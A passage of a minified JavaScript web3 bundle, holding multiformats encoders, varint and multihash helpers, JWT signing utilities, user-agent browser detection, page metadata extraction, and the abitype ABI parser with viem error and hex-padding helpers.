e=[];for(const r of t){const n=WR[r.codePointAt(0)];if(n===void 0)throw new Error(`Non-base256emoji character: ${r}`);e.push(n)}return new Uint8Array(e)}const KR=_f({prefix:"",name:"base256emoji",encode:GR,decode:VR});var QR=Object.freeze({__proto__:null,base256emoji:KR}),YR=r_,qw=128,JR=-128,ZR=Math.pow(2,31);function r_(t,e,r){e=e||[],r=r||0;for(var n=r;t>=ZR;)e[r++]=t&255|qw,t/=128;for(;t&JR;)e[r++]=t&255|qw,t>>>=7;return e[r]=t|0,r_.bytes=r-n+1,e}var XR=vm,e3=128,zw=127;function vm(t,n){var r=0,n=n||0,i=0,s=n,o,a=t.length;do{if(s>=a)throw vm.bytes=0,new RangeError("Could not decode varint");o=t[s++],r+=i<28?(o&zw)<<i:(o&zw)*Math.pow(2,i),i+=7}while(o>=e3);return vm.bytes=s-n,r}var t3=Math.pow(2,7),r3=Math.pow(2,14),n3=Math.pow(2,21),i3=Math.pow(2,28),s3=Math.pow(2,35),o3=Math.pow(2,42),a3=Math.pow(2,49),c3=Math.pow(2,56),u3=Math.pow(2,63),l3=function(t){return t<t3?1:t<r3?2:t<n3?3:t<i3?4:t<s3?5:t<o3?6:t<a3?7:t<c3?8:t<u3?9:10},h3={encode:YR,decode:XR,encodingLength:l3},n_=h3;const Hw=(t,e,r=0)=>(n_.encode(t,e,r),e),Ww=t=>n_.encodingLength(t),Em=(t,e)=>{const r=e.byteLength,n=Ww(t),i=n+Ww(r),s=new Uint8Array(i+r);return Hw(t,s,0),Hw(r,s,n),s.set(e,i),new d3(t,r,e,s)};let d3=class{constructor(e,r,n,i){this.code=e,this.size=r,this.digest=n,this.bytes=i}};const i_=({name:t,code:e,encode:r})=>new f3(t,e,r);let f3=class{constructor(e,r,n){this.name=e,this.code=r,this.encode=n}digest(e){if(e instanceof Uint8Array){const r=this.encode(e);return r instanceof Uint8Array?Em(this.code,r):r.then(n=>Em(this.code,n))}else throw Error("Unknown type, must be binary type")}};const s_=t=>async e=>new Uint8Array(await crypto.subtle.digest(t,e)),p3=i_({name:"sha2-256",code:18,encode:s_("SHA-256")}),g3=i_({name:"sha2-512",code:19,encode:s_("SHA-512")});var m3=Object.freeze({__proto__:null,sha256:p3,sha512:g3});const o_=0,y3="identity",a_=X1,w3=t=>Em(o_,a_(t)),b3={code:o_,name:y3,encode:a_,digest:w3};var v3=Object.freeze({__proto__:null,identity:b3});new TextEncoder,new TextDecoder;const Gw={...fR,...gR,...yR,...bR,...AR,...OR,...MR,...$R,...zR,...QR};({...m3,...v3});function c_(t,e,r,n){return{name:t,prefix:e,encoder:{name:t,prefix:e,encode:r},decoder:{decode:n}}}const Vw=c_("utf8","u",t=>"u"+new TextDecoder("utf8").decode(t),t=>new TextEncoder().encode(t.substring(1))),zp=c_("ascii","a",t=>{let e="a";for(let r=0;r<t.length;r++)e+=String.fromCharCode(t[r]);return e},t=>{t=t.substring(1);const e=J1(t.length);for(let r=0;r<t.length;r++)e[r]=t.charCodeAt(r);return e}),u_={utf8:Vw,"utf-8":Vw,hex:Gw.base16,latin1:zp,ascii:zp,binary:zp,...Gw};function Cf(t,e="utf8"){const r=u_[e];if(!r)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?globalThis.Buffer.from(t.buffer,t.byteOffset,t.byteLength).toString("utf8"):r.encoder.encode(t).substring(1)}function Mc(t,e="utf8"){const r=u_[e];if(!r)throw new Error(`Unsupported encoding "${e}"`);return(e==="utf8"||e==="utf-8")&&globalThis.Buffer!=null&&globalThis.Buffer.from!=null?X0(globalThis.Buffer.from(t,"utf-8")):r.decoder.decode(`${r.prefix}${t}`)}function Kw(t){return Zo(Cf(Mc(t,Af),Q1))}function Pd(t){return Cf(Mc(ys(t),Q1),Af)}function l_(t){const e=Mc(XP,jw),r=ZP+Cf(Z1([e,t]),jw);return[YP,JP,r].join(QP)}function E3(t){return Cf(t,Af)}function A3(t){return Mc(t,Af)}function _3(t){return Mc([Pd(t.header),Pd(t.payload)].join(Td),Y1)}function C3(t){return[Pd(t.header),Pd(t.payload),E3(t.signature)].join(Td)}function Am(t){const e=t.split(Td),r=Kw(e[0]),n=Kw(e[1]),i=A3(e[2]),s=Mc(e.slice(0,2).join(Td),Y1);return{header:r,payload:n,signature:i,data:s}}function Qw(t=$1(eR)){const e=K1.getPublicKey(t);return{secretKey:Z1([t,e]),publicKey:e}}async function I3(t,e,r,n,i=se.fromMiliseconds(Date.now())){const s={alg:VP,typ:KP},o=l_(n.publicKey),a=i+r,c={iss:o,sub:t,aud:e,iat:i,exp:a},u=_3({header:s,payload:c}),l=K1.sign(u,n.secretKey.slice(0,32));return C3({header:s,payload:c,signature:l})}var Yw=function(t,e,r){if(r||arguments.length===2)for(var n=0,i=e.length,s;n<i;n++)(s||!(n in e))&&(s||(s=Array.prototype.slice.call(e,0,n)),s[n]=e[n]);return t.concat(s||Array.prototype.slice.call(e))},x3=function(){function t(e,r,n){this.name=e,this.version=r,this.os=n,this.type="browser"}return t}(),S3=function(){function t(e){this.version=e,this.type="node",this.name="node",this.os=process.platform}return t}(),N3=function(){function t(e,r,n,i){this.name=e,this.version=r,this.os=n,this.bot=i,this.type="bot-device"}return t}(),T3=function(){function t(){this.type="bot",this.bot=!0,this.name="bot",this.version=null,this.os=null}return t}(),P3=function(){function t(){this.type="react-native",this.name="react-native",this.version=null,this.os=null}return t}(),R3=/alexa|bot|crawl(er|ing)|facebookexternalhit|feedburner|google web preview|nagios|postrank|pingdom|slurp|spider|yahoo!|yandex/,O3=/(nuhk|curl|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask\ Jeeves\/Teoma|ia_archiver)/,Jw=3,k3=[["aol",/AOLShield\/([0-9\._]+)/],["edge",/Edge\/([0-9\._]+)/],["edge-ios",/EdgiOS\/([0-9\._]+)/],["yandexbrowser",/YaBrowser\/([0-9\._]+)/],["kakaotalk",/KAKAOTALK\s([0-9\.]+)/],["samsung",/SamsungBrowser\/([0-9\.]+)/],["silk",/\bSilk\/([0-9._-]+)\b/],["miui",/MiuiBrowser\/([0-9\.]+)$/],["beaker",/BeakerBrowser\/([0-9\.]+)/],["edge-chromium",/EdgA?\/([0-9\.]+)/],["chromium-webview",/(?!Chrom.*OPR)wv\).*Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/],["chrome",/(?!Chrom.*OPR)Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/],["phantomjs",/PhantomJS\/([0-9\.]+)(:?\s|$)/],["crios",/CriOS\/([0-9\.]+)(:?\s|$)/],["firefox",/Firefox\/([0-9\.]+)(?:\s|$)/],["fxios",/FxiOS\/([0-9\.]+)/],["opera-mini",/Opera Mini.*Version\/([0-9\.]+)/],["opera",/Opera\/([0-9\.]+)(?:\s|$)/],["opera",/OPR\/([0-9\.]+)(:?\s|$)/],["pie",/^Microsoft Pocket Internet Explorer\/(\d+\.\d+)$/],["pie",/^Mozilla\/\d\.\d+\s\(compatible;\s(?:MSP?IE|MSInternet Explorer) (\d+\.\d+);.*Windows CE.*\)$/],["netfront",/^Mozilla\/\d\.\d+.*NetFront\/(\d.\d)/],["ie",/Trident\/7\.0.*rv\:([0-9\.]+).*\).*Gecko$/],["ie",/MSIE\s([0-9\.]+);.*Trident\/[4-7].0/],["ie",/MSIE\s(7\.0)/],["bb10",/BB10;\sTouch.*Version\/([0-9\.]+)/],["android",/Android\s([0-9\.]+)/],["ios",/Version\/([0-9\._]+).*Mobile.*Safari.*/],["safari",/Version\/([0-9\._]+).*Safari/],["facebook",/FB[AS]V\/([0-9\.]+)/],["instagram",/Instagram\s([0-9\.]+)/],["ios-webview",/AppleWebKit\/([0-9\.]+).*Mobile/],["ios-webview",/AppleWebKit\/([0-9\.]+).*Gecko\)$/],["curl",/^curl\/([0-9\.]+)$/],["searchbot",R3]],Zw=[["iOS",/iP(hone|od|ad)/],["Android OS",/Android/],["BlackBerry OS",/BlackBerry|BB10/],["Windows Mobile",/IEMobile/],["Amazon OS",/Kindle/],["Windows 3.11",/Win16/],["Windows 95",/(Windows 95)|(Win95)|(Windows_95)/],["Windows 98",/(Windows 98)|(Win98)/],["Windows 2000",/(Windows NT 5.0)|(Windows 2000)/],["Windows XP",/(Windows NT 5.1)|(Windows XP)/],["Windows Server 2003",/(Windows NT 5.2)/],["Windows Vista",/(Windows NT 6.0)/],["Windows 7",/(Windows NT 6.1)/],["Windows 8",/(Windows NT 6.2)/],["Windows 8.1",/(Windows NT 6.3)/],["Windows 10",/(Windows NT 10.0)/],["Windows ME",/Windows ME/],["Windows CE",/Windows CE|WinCE|Microsoft Pocket Internet Explorer/],["Open BSD",/OpenBSD/],["Sun OS",/SunOS/],["Chrome OS",/CrOS/],["Linux",/(Linux)|(X11)/],["Mac OS",/(Mac_PowerPC)|(Macintosh)/],["QNX",/QNX/],["BeOS",/BeOS/],["OS/2",/OS\/2/]];function D3(t){return typeof document>"u"&&typeof navigator<"u"&&navigator.product==="ReactNative"?new P3:typeof navigator<"u"?B3(navigator.userAgent):$3()}function M3(t){return t!==""&&k3.reduce(function(e,r){var n=r[0],i=r[1];if(e)return e;var s=i.exec(t);return!!s&&[n,s]},!1)}function B3(t){var e=M3(t);if(!e)return null;var r=e[0],n=e[1];if(r==="searchbot")return new T3;var i=n[1]&&n[1].split(".").join("_").split("_").slice(0,3);i?i.length<Jw&&(i=Yw(Yw([],i,!0),L3(Jw-i.length),!0)):i=[];var s=i.join("."),o=U3(t),a=O3.exec(t);return a&&a[1]?new N3(r,s,o,a[1]):new x3(r,s,o)}function U3(t){for(var e=0,r=Zw.length;e<r;e++){var n=Zw[e],i=n[0],s=n[1],o=s.exec(t);if(o)return i}return null}function $3(){var t=typeof process<"u"&&process.version;return t?new S3(process.version.slice(1)):null}function L3(t){for(var e=[],r=0;r<t;r++)e.push("0");return e}var gt={},Xw;function h_(){if(Xw)return gt;Xw=1,Object.defineProperty(gt,"__esModule",{value:!0}),gt.getLocalStorage=gt.getLocalStorageOrThrow=gt.getCrypto=gt.getCryptoOrThrow=gt.getLocation=gt.getLocationOrThrow=gt.getNavigator=gt.getNavigatorOrThrow=gt.getDocument=gt.getDocumentOrThrow=gt.getFromWindowOrThrow=gt.getFromWindow=void 0;function t(d){let g;return typeof window<"u"&&typeof window[d]<"u"&&(g=window[d]),g}gt.getFromWindow=t;function e(d){const g=t(d);if(!g)throw new Error(`${d} is not defined in Window`);return g}gt.getFromWindowOrThrow=e;function r(){return e("document")}gt.getDocumentOrThrow=r;function n(){return t("document")}gt.getDocument=n;function i(){return e("navigator")}gt.getNavigatorOrThrow=i;function s(){return t("navigator")}gt.getNavigator=s;function o(){return e("location")}gt.getLocationOrThrow=o;function a(){return t("location")}gt.getLocation=a;function c(){return e("crypto")}gt.getCryptoOrThrow=c;function u(){return t("crypto")}gt.getCrypto=u;function l(){return e("localStorage")}gt.getLocalStorageOrThrow=l;function h(){return t("localStorage")}return gt.getLocalStorage=h,gt}var Xo=h_(),eu={},eb;function F3(){if(eb)return eu;eb=1,Object.defineProperty(eu,"__esModule",{value:!0}),eu.getWindowMetadata=void 0;const t=h_();function e(){let r,n;try{r=t.getDocumentOrThrow(),n=t.getLocationOrThrow()}catch{return null}function i(){const g=r.getElementsByTagName("link"),y=[];for(let m=0;m<g.length;m++){const b=g[m],A=b.getAttribute("rel");if(A&&A.toLowerCase().indexOf("icon")>-1){const _=b.getAttribute("href");if(_)if(_.toLowerCase().indexOf("https:")===-1&&_.toLowerCase().indexOf("http:")===-1&&_.indexOf("//")!==0){let T=n.protocol+"//"+n.host;if(_.indexOf("/")===0)T+=_;else{const P=n.pathname.split("/");P.pop();const S=P.join("/");T+=S+"/"+_}y.push(T)}else if(_.indexOf("//")===0){const T=n.protocol+_;y.push(T)}else y.push(_)}}return y}function s(...g){const y=r.getElementsByTagName("meta");for(let m=0;m<y.length;m++){const b=y[m],A=["itemprop","property","name"].map(_=>b.getAttribute(_)).filter(_=>_?g.includes(_):!1);if(A.length&&A){const _=b.getAttribute("content");if(_)return _}}return""}function o(){let g=s("name","og:site_name","og:title","twitter:title");return g||(g=r.title),g}function a(){return s("description","og:description","twitter:description","keywords")}const c=o(),u=a(),l=n.origin,h=i();return{description:u,url:l,icons:h,name:c}}return eu.getWindowMetadata=e,eu}var j3=F3();const q3="1.0.8";let Kn=class _m extends Error{constructor(e,r={}){var o;const n=r.cause instanceof _m?r.cause.details:(o=r.cause)!=null&&o.message?r.cause.message:r.details,i=r.cause instanceof _m&&r.cause.docsPath||r.docsPath,s=[e||"An error occurred.","",...r.metaMessages?[...r.metaMessages,""]:[],...i?[`Docs: https://abitype.dev${i}`]:[],...n?[`Details: ${n}`]:[],`Version: abitype@${q3}`].join(`
`);super(s),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docsPath",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"metaMessages",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"shortMessage",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"AbiTypeError"}),r.cause&&(this.cause=r.cause),this.details=n,this.docsPath=i,this.metaMessages=r.metaMessages,this.shortMessage=e}};function As(t,e){const r=t.exec(e);return r==null?void 0:r.groups}const d_=/^bytes([1-9]|1[0-9]|2[0-9]|3[0-2])?$/,f_=/^u?int(8|16|24|32|40|48|56|64|72|80|88|96|104|112|120|128|136|144|152|160|168|176|184|192|200|208|216|224|232|240|248|256)?$/,p_=/^\(.+?\).*?$/,tb=/^tuple(?<array>(\[(\d*)\])*)$/;function Cm(t){let e=t.type;if(tb.test(t.type)&&"components"in t){e="(";const r=t.components.length;for(let i=0;i<r;i++){const s=t.components[i];e+=Cm(s),i<r-1&&(e+=", ")}const n=As(tb,t.type);return e+=`)${(n==null?void 0:n.array)??""}`,Cm({...t,type:e})}return"indexed"in t&&t.indexed&&(e=`${e} indexed`),t.name?`${e} ${t.name}`:e}function tu(t){let e="";const r=t.length;for(let n=0;n<r;n++){const i=t[n];e+=Cm(i),n!==r-1&&(e+=", ")}return e}function z3(t){var e;return t.type==="function"?`function ${t.name}(${tu(t.inputs)})${t.stateMutability&&t.stateMutability!=="nonpayable"?` ${t.stateMutability}`:""}${(e=t.outputs)!=null&&e.length?` returns (${tu(t.outputs)})`:""}`:t.type==="event"?`event ${t.name}(${tu(t.inputs)})`:t.type==="error"?`error ${t.name}(${tu(t.inputs)})`:t.type==="constructor"?`constructor(${tu(t.inputs)})${t.stateMutability==="payable"?" payable":""}`:t.type==="fallback"?`fallback() external${t.stateMutability==="payable"?" payable":""}`:"receive() external payable"}const g_=/^error (?<name>[a-zA-Z$_][a-zA-Z0-9$_]*)\((?<parameters>.*?)\)$/;function H3(t){return g_.test(t)}function W3(t){return As(g_,t)}const m_=/^event (?<name>[a-zA-Z$_][a-zA-Z0-9$_]*)\((?<parameters>.*?)\)$/;function G3(t){return m_.test(t)}function V3(t){return As(m_,t)}const y_=/^function (?<name>[a-zA-Z$_][a-zA-Z0-9$_]*)\((?<parameters>.*?)\)(?: (?<scope>external|public{1}))?(?: (?<stateMutability>pure|view|nonpayable|payable{1}))?(?: returns\s?\((?<returns>.*?)\))?$/;function K3(t){return y_.test(t)}function Q3(t){return As(y_,t)}const w_=/^struct (?<name>[a-zA-Z$_][a-zA-Z0-9$_]*) \{(?<properties>.*?)\}$/;function b_(t){return w_.test(t)}function Y3(t){return As(w_,t)}const v_=/^constructor\((?<parameters>.*?)\)(?:\s(?<stateMutability>payable{1}))?$/;function J3(t){return v_.test(t)}function Z3(t){return As(v_,t)}const E_=/^fallback\(\) external(?:\s(?<stateMutability>payable{1}))?$/;function X3(t){return E_.test(t)}function eO(t){return As(E_,t)}const tO=/^receive\(\) external payable$/;function rO(t){return tO.test(t)}const nO=new Set(["indexed"]),Im=new Set(["calldata","memory","storage"]);class iO extends Kn{constructor({type:e}){super("Unknown type.",{metaMessages:[`Type "${e}" is not a valid ABI type. Perhaps you forgot to include a struct signature?`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"UnknownTypeError"})}}class sO extends Kn{constructor({type:e}){super("Unknown type.",{metaMessages:[`Type "${e}" is not a valid ABI type.`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"UnknownSolidityTypeError"})}}class oO extends Kn{constructor({param:e}){super("Invalid ABI parameter.",{details:e}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidParameterError"})}}class aO extends Kn{constructor({param:e,name:r}){super("Invalid ABI parameter.",{details:e,metaMessages:[`"${r}" is a protected Solidity keyword. More info: https://docs.soliditylang.org/en/latest/cheatsheet.html`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"SolidityProtectedKeywordError"})}}class cO extends Kn{constructor({param:e,type:r,modifier:n}){super("Invalid ABI parameter.",{details:e,metaMessages:[`Modifier "${n}" not allowed${r?` in "${r}" type`:""}.`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidModifierError"})}}class uO extends Kn{constructor({param:e,type:r,modifier:n}){super("Invalid ABI parameter.",{details:e,metaMessages:[`Modifier "${n}" not allowed${r?` in "${r}" type`:""}.`,`Data location can only be specified for array, struct, or mapping types, but "${n}" was given.`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidFunctionModifierError"})}}class lO extends Kn{constructor({abiParameter:e}){super("Invalid ABI parameter.",{details:JSON.stringify(e,null,2),metaMessages:["ABI parameter type is invalid."]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidAbiTypeParameterError"})}}class Bc extends Kn{constructor({signature:e,type:r}){super(`Invalid ${r} signature.`,{details:e}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidSignatureError"})}}class hO extends Kn{constructor({signature:e}){super("Unknown signature.",{details:e}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"UnknownSignatureError"})}}class dO extends Kn{constructor({signature:e}){super("Invalid struct signature.",{details:e,metaMessages:["No properties exist."]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidStructSignatureError"})}}class fO extends Kn{constructor({type:e}){super("Circular reference detected.",{metaMessages:[`Struct "${e}" is a circular reference.`]}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"CircularReferenceError"})}}class pO extends Kn{constructor({current:e,depth:r}){super("Unbalanced parentheses.",{metaMessages:[`"${e.trim()}" has too many ${r>0?"opening":"closing"} parentheses.`],details:`Depth "${r}"`}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"InvalidParenthesisError"})}}function gO(t,e,r){let n="";if(r)for(const i of Object.entries(r)){if(!i)continue;let s="";for(const o of i[1])s+=`[${o.type}${o.name?`:${o.name}`:""}]`;n+=`(${i[0]}{${s}})`}return e?`${e}:${t}${n}`:t}const Hp=new Map([["address",{type:"address"}],["bool",{type:"bool"}],["bytes",{type:"bytes"}],["bytes32",{type:"bytes32"}],["int",{type:"int256"}],["int256",{type:"int256"}],["string",{type:"string"}],["uint",{type:"uint256"}],["uint8",{type:"uint8"}],["uint16",{type:"uint16"}],["uint24",{type:"uint24"}],["uint32",{type:"uint32"}],["uint64",{type:"uint64"}],["uint96",{type:"uint96"}],["uint112",{type:"uint112"}],["uint160",{type:"uint160"}],["uint192",{type:"uint192"}],["uint256",{type:"uint256"}],["address owner",{type:"address",name:"owner"}],["address to",{type:"address",name:"to"}],["bool approved",{type:"bool",name:"approved"}],["bytes _data",{type:"bytes",name:"_data"}],["bytes data",{type:"bytes",name:"data"}],["bytes signature",{type:"bytes",name:"signature"}],["bytes32 hash",{type:"bytes32",name:"hash"}],["bytes32 r",{type:"bytes32",name:"r"}],["bytes32 root",{type:"bytes32",name:"root"}],["bytes32 s",{type:"bytes32",name:"s"}],["string name",{type:"string",name:"name"}],["string symbol",{type:"string",name:"symbol"}],["string tokenURI",{type:"string",name:"tokenURI"}],["uint tokenId",{type:"uint256",name:"tokenId"}],["uint8 v",{type:"uint8",name:"v"}],["uint256 balance",{type:"uint256",name:"balance"}],["uint256 tokenId",{type:"uint256",name:"tokenId"}],["uint256 value",{type:"uint256",name:"value"}],["event:address indexed from",{type:"address",name:"from",indexed:!0}],["event:address indexed to",{type:"address",name:"to",indexed:!0}],["event:uint indexed tokenId",{type:"uint256",name:"tokenId",indexed:!0}],["event:uint256 indexed tokenId",{type:"uint256",name:"tokenId",indexed:!0}]]);function mO(t,e={}){if(K3(t))return yO(t,e);if(G3(t))return wO(t,e);if(H3(t))return bO(t,e);if(J3(t))return vO(t,e);if(X3(t))return EO(t);if(rO(t))return{type:"receive",stateMutability:"payable"};throw new hO({signature:t})}function yO(t,e={}){const r=Q3(t);if(!r)throw new Bc({signature:t,type:"function"});const n=li(r.parameters),i=[],s=n.length;for(let a=0;a<s;a++)i.push(ea(n[a],{modifiers:Im,structs:e,type:"function"}));const o=[];if(r.returns){const a=li(r.returns),c=a.length;for(let u=0;u<c;u++)o.push(ea(a[u],{modifiers:Im,structs:e,type:"function"}))}return{name:r.name,type:"function",stateMutability:r.stateMutability??"nonpayable",inputs:i,outputs:o}}function wO(t,e={}){const r=V3(t);if(!r)throw new Bc({signature:t,type:"event"});const n=li(r.parameters),i=[],s=n.length;for(let o=0;o<s;o++)i.push(ea(n[o],{modifiers:nO,structs:e,type:"event"}));return{name:r.name,type:"event",inputs:i}}function bO(t,e={}){const r=W3(t);if(!r)throw new Bc({signature:t,type:"error"});const n=li(r.parameters),i=[],s=n.length;for(let o=0;o<s;o++)i.push(ea(n[o],{structs:e,type:"error"}));return{name:r.name,type:"error",inputs:i}}function vO(t,e={}){const r=Z3(t);if(!r)throw new Bc({signature:t,type:"constructor"});const n=li(r.parameters),i=[],s=n.length;for(let o=0;o<s;o++)i.push(ea(n[o],{structs:e,type:"constructor"}));return{type:"constructor",stateMutability:r.stateMutability??"nonpayable",inputs:i}}function EO(t){const e=eO(t);if(!e)throw new Bc({signature:t,type:"fallback"});return{type:"fallback",stateMutability:e.stateMutability??"nonpayable"}}const AO=/^(?<type>[a-zA-Z$_][a-zA-Z0-9$_]*)(?<array>(?:\[\d*?\])+?)?(?:\s(?<modifier>calldata|indexed|memory|storage{1}))?(?:\s(?<name>[a-zA-Z$_][a-zA-Z0-9$_]*))?$/,_O=/^\((?<type>.+?)\)(?<array>(?:\[\d*?\])+?)?(?:\s(?<modifier>calldata|indexed|memory|storage{1}))?(?:\s(?<name>[a-zA-Z$_][a-zA-Z0-9$_]*))?$/,CO=/^u?int$/;function ea(t,e){var h,d;const r=gO(t,e==null?void 0:e.type,e==null?void 0:e.structs);if(Hp.has(r))return Hp.get(r);const n=p_.test(t),i=As(n?_O:AO,t);if(!i)throw new oO({param:t});if(i.name&&xO(i.name))throw new aO({param:t,name:i.name});const s=i.name?{name:i.name}:{},o=i.modifier==="indexed"?{indexed:!0}:{},a=(e==null?void 0:e.structs)??{};let c,u={};if(n){c="tuple";const g=li(i.type),y=[],m=g.length;for(let b=0;b<m;b++)y.push(ea(g[b],{structs:a}));u={components:y}}else if(i.type in a)c="tuple",u={components:a[i.type]};else if(CO.test(i.type))c=`${i.type}256`;else if(c=i.type,(e==null?void 0:e.type)!=="struct"&&!A_(c))throw new sO({type:c});if(i.modifier){if(!((d=(h=e==null?void 0:e.modifiers)==null?void 0:h.has)!=null&&d.call(h,i.modifier)))throw new cO({param:t,type:e==null?void 0:e.type,modifier:i.modifier});if(Im.has(i.modifier)&&!SO(c,!!i.array))throw new uO({param:t,type:e==null?void 0:e.type,modifier:i.modifier})}const l={type:`${c}${i.array??""}`,...s,...o,...u};return Hp.set(r,l),l}function li(t,e=[],r="",n=0){const i=t.trim().length;for(let s=0;s<i;s++){const o=t[s],a=t.slice(s+1);switch(o){case",":return n===0?li(a,[...e,r.trim()]):li(a,e,`${r}${o}`,n);case"(":return li(a,e,`${r}${o}`,n+1);case")":return li(a,e,`${r}${o}`,n-1);default:return li(a,e,`${r}${o}`,n)}}if(r==="")return e;if(n!==0)throw new pO({current:r,depth:n});return e.push(r.trim()),e}function A_(t){return t==="address"||t==="bool"||t==="function"||t==="string"||d_.test(t)||f_.test(t)}const IO=/^(?:after|alias|anonymous|apply|auto|byte|calldata|case|catch|constant|copyof|default|defined|error|event|external|false|final|function|immutable|implements|in|indexed|inline|internal|let|mapping|match|memory|mutable|null|of|override|partial|private|promise|public|pure|reference|relocatable|return|returns|sizeof|static|storage|struct|super|supports|switch|this|true|try|typedef|typeof|var|view|virtual)$/;function xO(t){return t==="address"||t==="bool"||t==="function"||t==="string"||t==="tuple"||d_.test(t)||f_.test(t)||IO.test(t)}function SO(t,e){return e||t==="bytes"||t==="string"||t==="tuple"}function NO(t){const e={},r=t.length;for(let o=0;o<r;o++){const a=t[o];if(!b_(a))continue;const c=Y3(a);if(!c)throw new Bc({signature:a,type:"struct"});const u=c.properties.split(";"),l=[],h=u.length;for(let d=0;d<h;d++){const y=u[d].trim();if(!y)continue;const m=ea(y,{type:"struct"});l.push(m)}if(!l.length)throw new dO({signature:a});e[c.name]=l}const n={},i=Object.entries(e),s=i.length;for(let o=0;o<s;o++){const[a,c]=i[o];n[a]=__(c,e)}return n}const TO=/^(?<type>[a-zA-Z$_][a-zA-Z0-9$_]*)(?<array>(?:\[\d*?\])+?)?$/;function __(t,e,r=new Set){const n=[],i=t.length;for(let s=0;s<i;s++){const o=t[s];if(p_.test(o.type))n.push(o);else{const c=As(TO,o.type);if(!(c!=null&&c.type))throw new lO({abiParameter:o});const{array:u,type:l}=c;if(l in e){if(r.has(l))throw new fO({type:l});n.push({...o,type:`tuple${u??""}`,components:__(e[l]??[],e,new Set([...r,l]))})}else if(A_(l))n.push(o);else throw new iO({type:l})}}return n}function C_(t){const e=NO(t),r=[],n=t.length;for(let i=0;i<n;i++){const s=t[i];b_(s)||r.push(mO(s,e))}return r}function Hu(t,{strict:e=!0}={}){return!t||typeof t!="string"?!1:e?/^0x[0-9a-fA-F]*$/.test(t):t.startsWith("0x")}function rb(t){return Hu(t,{strict:!1})?Math.ceil((t.length-2)/2):t.length}const I_="2.23.2";let ru={getDocsUrl:({docsBaseUrl:t,docsPath:e="",docsSlug:r})=>e?`${t??"https://viem.sh"}${e}${r?`#${r}`:""}`:void 0,version:`viem@${I_}`},If=class xm extends Error{constructor(e,r={}){var a;const n=(()=>{var c;return r.cause instanceof xm?r.cause.details:(c=r.cause)!=null&&c.message?r.cause.message:r.details})(),i=r.cause instanceof xm&&r.cause.docsPath||r.docsPath,s=(a=ru.getDocsUrl)==null?void 0:a.call(ru,{...r,docsPath:i}),o=[e||"An error occurred.","",...r.metaMessages?[...r.metaMessages,""]:[],...s?[`Docs: ${s}`]:[],...n?[`Details: ${n}`]:[],...ru.version?[`Version: ${ru.version}`]:[]].join(`
`);super(o,r.cause?{cause:r.cause}:void 0),Object.defineProperty(this,"details",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"docsPath",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"metaMessages",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"shortMessage",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"version",{enumerable:!0,configurable:!0,writable:!0,value:void 0}),Object.defineProperty(this,"name",{enumerable:!0,configurable:!0,writable:!0,value:"BaseError"}),this.details=n,this.docsPath=i,this.metaMessages=r.metaMessages,this.name=r.name??this.name,this.shortMessage=e,this.version=I_}walk(e){return x_(this,e)}};function x_(t,e){return e!=null&&e(t)?t:t&&typeof t=="object"&&"cause"in t&&t.cause!==void 0?x_(t.cause,e):e?null:t}let S_=class extends If{constructor({size:e,targetSize:r,type:n}){super(`${n.charAt(0).toUpperCase()}${n.slice(1).toLowerCase()} size (${e}) exceeds padding size (${r}).`,{name:"SizeExceedsPaddingSizeError"})}};function Uc(t,{dir:e,size:r=32}={}){return typeof t=="string"?PO(t,{dir:e,size:r}):RO(t,{dir:e,size:r})}function PO(t,{dir:e,size:r=32}={}){if(r===null)return t;const n=t.replace("0x","");if(n.length>r*2)throw new S_({size:Math.ceil(n.length/2),targetSize:r,type:"hex"});return`0x${n[e==="right"?"padEnd":"padStart"](r*2,"0")}`}function RO(t,{dir:e,size:r=32}={}){if(r===null)return t;if(t.length>r)throw new S_({size:t.length,targetSize:r,type:"bytes"});const n=new Uint8Array(r);for(let i=0;i<r;i++){const s=e==="right";n[s?i:r-i-1]=t[s?i:t.length-i-1]}return n}let OO=class extends If{constructor({max:e,min:r,signed:n,size:i,value:s}){super(`Number "${s}" is not in safe ${i?`${i*8}-bit ${n?"signed":"unsigned"} `:""}integer range ${e?`(${r} to ${e})`:`(above ${r})`}`,{name:"IntegerOutOfRangeError"})}},kO=class extends If{constructor({givenSize:e,maxSize:r}){super(`Size cannot exceed ${r} bytes. Given size: ${e} bytes.`,{name:"SizeOverflowError"})}};function $c(t,{size:e}){if(rb(t)>e)throw new kO({givenSize:rb(t),maxSize:e})}function Sm(t,e={}){const{signed:r}=e;e.size&&$c(t,{size:e.size});const n=BigInt(t);if(!r)return n;const i=(t.length-2)/2,s=(1n<<BigInt(i)*8n-1n)-1n;return n<=s?n:n-BigInt(`0x${"f".padStart(i*2,"f")}`)-1n}function DO(t,e={}){return Number(Sm(t,e))}const 